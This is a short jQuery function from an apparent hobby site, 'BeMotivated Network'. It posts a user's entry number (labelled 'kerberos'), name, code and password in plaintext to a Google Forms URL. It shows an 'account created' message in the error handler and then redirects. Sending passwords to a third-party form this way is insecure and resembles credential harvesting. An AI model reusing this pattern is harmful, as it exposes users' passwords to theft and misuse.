function postToGoogle() {
                var kerberos = $("#entrynumber").val();
                var code = $("#code").val();
                var name = $("#name").val();
                var password = $("#password").val();

                $.ajax({
                    url: "https://docs.google.com/forms/d/e/1FAIpQLScCsaYgEEEZvqmkZ2rNdOFaj_gLzi8Zz0_HptJpvC46KB3YJg/formResponse?",
          data: {"entry.234205175": kerberos, "entry.1140686131": code, "entry.569208933": name, "entry.907061108": password},
                    type: "POST",
                    dataType: "xml",
                    success: function(d)
          {
          },
          error: function(x, y, z)
            {
              alert("Thanks! Your account has been created.\nNow you can post your stories on BeMotivated Network.")
              window.open("https://krdipen.github.io/BeMotivated/","_top");
            }
                });
        return false;
            }
